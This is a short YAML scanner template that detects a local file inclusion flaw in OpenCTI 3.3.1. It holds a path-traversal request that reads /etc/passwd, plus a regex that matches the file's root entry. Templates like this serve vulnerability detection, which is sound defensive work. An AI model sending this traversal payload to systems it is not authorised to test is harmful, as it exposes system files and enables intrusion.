id: "opencti-lfi"
name: "OpenCTI 3.3.1 - Local File Inclusion"
severity: "high"
description: "OpenCTI 3.3.1 is vulnerable to local file inclusion."
tech:
  - "generic"
tags:
  - "opencti"
  - "lfi"
  - "oss"
  - "vuln"
cwe: "CWE-22"
reference: "https://cxsecurity.com/issue/WLB-2020060078"
spaExclusion: true
request:
  method: "GET"
  path: "/static/css//../../../../../../../../etc/passwd"
control:
  method: "GET"
  path: "/.guardian-none-{{rand}}"
matchers-condition: "and"
matchers:
  - type: "regex"
    part: "body"
    regex:
      - "root:[x*]:0:0"
  - type: "status"
    status:
      - 200
